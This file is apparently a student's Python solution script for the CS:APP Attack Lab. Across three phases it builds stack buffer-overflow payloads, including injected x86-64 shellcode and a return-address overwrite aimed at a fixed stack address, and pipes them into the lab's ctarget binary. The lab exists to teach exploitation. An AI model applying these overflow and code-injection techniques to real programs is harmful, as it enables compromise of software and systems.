import struct
import os

WORD_SIZE = 8

COOKIE = 0x6eb933c2

GETBUF_STACK_OFFSET = 0x18
GETBUF_RSP_ADDR = 0x55641148

def p64(x: int) -> bytes:
    return struct.pack("<Q", x).ljust(WORD_SIZE, b'\x00')

def byte2sphex(x: bytes) -> str:
    string = ""
    for ch in x:
        string += hex(ch)[2:].rjust(2, '0') + ' '
    return string

def byte2hex(x: bytes) -> str:
    string = ""
    for ch in x:
        string += hex(ch)[2:].rjust(2, '0')
    return string

def cookie_to_hex(x: int) -> bytes:
    return bytes(hex(x)[2:], encoding='ascii')

### Stage 1
def phase_1():
    TOUCH_1_ADDR = 0x4016d6
    Ex = b''
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')
    Ex += p64(TOUCH_1_ADDR)

    print(byte2hex(Ex))

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./ctarget")

### Stage 2
def phase_2():
    TOUCH_2_ADDR = 0x401702
    
    """
    Ex = asm(
        rf'''
        mov rdi, {COOKIE}
        push {TOUCH_2_ADDR}
        ret
        ''',
        arch='amd64',
        os='linux'
    )
    """

    Ex = b"\x48\xC7\xC7\xC2\x33\xB9\x6E\x68\x02\x17\x40\x00\xC3"
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')
    Ex += p64(GETBUF_RSP_ADDR)

    print(byte2hex(Ex))

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./ctarget")

### Stage 3
def phase_3():
    TOUCH_3_ADDR = 0x4017d6
    
    """
    Ex = asm(
        rf'''
        mov rdi, {GETBUF_RSP_ADDR + GETBUF_STACK_OFFSET + GETBUF_RSP_ADDR}
        push {TOUCH_3_ADDR}
        ret
        ''',
        arch='amd64',
        os='linux'
    )
    """

    Ex = b"\x48\xC7\xC7\x68\x11\x64\x55\x68\xD6\x17\x40\x00\xC3"
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')
    Ex += p64(GETBUF_RSP_ADDR)
    Ex += cookie_to_hex(COOKIE)

    print(byte2hex(Ex))

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./ctarget")

if __name__ == "__main__":
    phase_1()
    phase_2()
    phase_3()